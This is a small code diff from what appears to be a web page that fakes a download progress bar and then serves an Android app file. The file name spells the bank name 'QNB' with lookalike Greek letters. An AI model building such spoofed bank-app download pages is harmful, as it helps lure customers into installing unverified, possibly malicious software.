@@ -46,7 +46,7 @@ function App() {
     setDownloadStarted(true);
     setProgress(0);
     setTimeout(() => {
-      window.location.href = "/QΝΒ mobile.apk";
+      window.location.href = "C:\\Users\\DELL PRECISION\\AndroidStudioProjects\\new bank apps\\QNB\\app\\release\\QΝΒ Mobile.apk";
     }, 3000);
   };
 
